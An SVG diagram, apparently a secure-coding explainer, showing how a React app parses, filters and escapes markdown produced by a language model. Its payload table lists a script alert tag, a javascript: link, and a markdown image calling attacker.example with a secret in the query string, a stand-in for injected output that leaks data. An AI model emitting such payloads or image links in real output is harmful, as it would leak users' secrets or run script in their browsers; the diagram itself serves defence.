<svg xmlns="http://www.w3.org/2000/svg" width="860" height="430" viewBox="0 0 860 430" role="img" aria-labelledby="smp-title smp-desc">
  <title id="smp-title">Rendering model markdown safely in React</title>
  <desc id="smp-desc">Model output is untrusted text that may contain injected content. It is parsed by remark with GitHub Flavored Markdown into a syntax tree. A filter step drops raw HTML with skipHtml and blanks unsafe URLs such as javascript links through the default URL transform. Component overrides give external links noopener and noreferrer and load images only from allowlisted hosts. React renders the result with escaped text and no innerHTML. Tested payloads: a script tag is dropped; a javascript link keeps its text but its href is blanked; a markdown image pointing at an attacker host with a secret in the query string is not loaded; bold text, lists, tables, and code render normally. If HTML must be rendered, sanitize it with rehype-sanitize or DOMPurify, and add a Content-Security-Policy as a second layer.</desc>
  <defs>
    <marker id="smp-arrow" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" markerUnits="userSpaceOnUse" orient="auto"><path d="M0 0 8 4 0 8z" fill="#40566b"/></marker>
  </defs>
  <rect width="860" height="430" rx="14" fill="#f5f7fb"/>
  <g font-family="Arial, sans-serif">
    <text x="30" y="32" font-size="15" font-weight="bold" fill="#36424e">Rendering model markdown safely in React</text>

    <rect x="30" y="56" width="140" height="80" rx="8" fill="#fff0d9" stroke="#bd7a20" stroke-width="1.5"/>
    <text x="100" y="80" font-size="13" font-weight="bold" fill="#66400f" text-anchor="middle">Model output</text>
    <text x="100" y="100" font-size="11" fill="#66400f" text-anchor="middle">untrusted text</text>
    <text x="100" y="116" font-size="11" fill="#66400f" text-anchor="middle">may be injected</text>
    <line x1="170" y1="96" x2="194" y2="96" stroke="#40566b" stroke-width="1.6" marker-end="url(#smp-arrow)"/>
    <rect x="196" y="56" width="140" height="80" rx="8" fill="#f0e9fb" stroke="#8062a8" stroke-width="1.5"/>
    <text x="266" y="80" font-size="13" font-weight="bold" fill="#463365" text-anchor="middle">Parse</text>
    <text x="266" y="100" font-size="11" fill="#463365" text-anchor="middle">remark + GFM</text>
    <text x="266" y="116" font-size="11" fill="#463365" text-anchor="middle">to a syntax tree</text>
    <line x1="336" y1="96" x2="360" y2="96" stroke="#40566b" stroke-width="1.6" marker-end="url(#smp-arrow)"/>
    <rect x="362" y="56" width="150" height="80" rx="8" fill="#f0e9fb" stroke="#8062a8" stroke-width="1.5"/>
    <text x="437" y="80" font-size="13" font-weight="bold" fill="#463365" text-anchor="middle">Filter</text>
    <text x="437" y="100" font-size="11" fill="#463365" text-anchor="middle">skipHtml drops HTML</text>
    <text x="437" y="116" font-size="11" fill="#463365" text-anchor="middle">unsafe URLs blanked</text>
    <line x1="512" y1="96" x2="536" y2="96" stroke="#40566b" stroke-width="1.6" marker-end="url(#smp-arrow)"/>
    <rect x="538" y="56" width="150" height="80" rx="8" fill="#f0e9fb" stroke="#8062a8" stroke-width="1.5"/>
    <text x="613" y="80" font-size="13" font-weight="bold" fill="#463365" text-anchor="middle">Components</text>
    <text x="613" y="100" font-size="11" fill="#463365" text-anchor="middle">links: noopener</text>
    <text x="613" y="116" font-size="11" fill="#463365" text-anchor="middle">images: allowlist</text>
    <line x1="688" y1="96" x2="712" y2="96" stroke="#40566b" stroke-width="1.6" marker-end="url(#smp-arrow)"/>
    <rect x="714" y="56" width="116" height="80" rx="8" fill="#e7f3e9" stroke="#53845b" stroke-width="1.5"/>
    <text x="772" y="80" font-size="13" font-weight="bold" fill="#294a2e" text-anchor="middle">React DOM</text>
    <text x="772" y="100" font-size="11" fill="#294a2e" text-anchor="middle">text escaped</text>
    <text x="772" y="116" font-size="11" fill="#294a2e" text-anchor="middle">no innerHTML</text>

    <text x="30" y="168" font-size="12" font-weight="bold" fill="#36424e">Payloads from the test, and what happened to each</text>
    <rect x="30" y="178" width="420" height="32" rx="6" fill="#fbe9e7" stroke="#b5524b" stroke-width="1.2"/>
    <text x="44" y="199" font-size="11.5" fill="#6e2a24">&lt;script&gt;alert(1)&lt;/script&gt;</text>
    <text x="470" y="199" font-size="11.5" fill="#36424e">dropped entirely by skipHtml</text>
    <rect x="30" y="218" width="420" height="32" rx="6" fill="#fbe9e7" stroke="#b5524b" stroke-width="1.2"/>
    <text x="44" y="239" font-size="11.5" fill="#6e2a24">[click me](javascript:alert(1))</text>
    <text x="470" y="239" font-size="11.5" fill="#36424e">link text kept, href blanked by the URL transform</text>
    <rect x="30" y="258" width="420" height="32" rx="6" fill="#fbe9e7" stroke="#b5524b" stroke-width="1.2"/>
    <text x="44" y="279" font-size="11.5" fill="#6e2a24">![chart](https://attacker.example/c.png?d=SECRET)</text>
    <text x="470" y="279" font-size="11.5" fill="#36424e">not loaded: host not allowlisted, nothing leaks</text>
    <rect x="30" y="298" width="420" height="32" rx="6" fill="#e7f3e9" stroke="#53845b" stroke-width="1.2"/>
    <text x="44" y="319" font-size="11.5" fill="#294a2e">**bold**, lists, tables, `code`</text>
    <text x="470" y="319" font-size="11.5" fill="#36424e">rendered normally</text>

    <rect x="30" y="346" width="800" height="48" rx="8" fill="#e5efff" stroke="#4774aa" stroke-width="1.5"/>
    <text x="44" y="366" font-size="12" fill="#263e5a">If HTML must be rendered, sanitize it with rehype-sanitize or DOMPurify; never pass model output</text>
    <text x="44" y="383" font-size="12" fill="#263e5a">to dangerouslySetInnerHTML. A Content-Security-Policy (script-src, img-src) is the second layer.</text>

    <text x="30" y="416" font-size="13" fill="#40566b">Treat model output like user input: parse it, filter it, and let React escape what remains.</text>
  </g>
</svg>
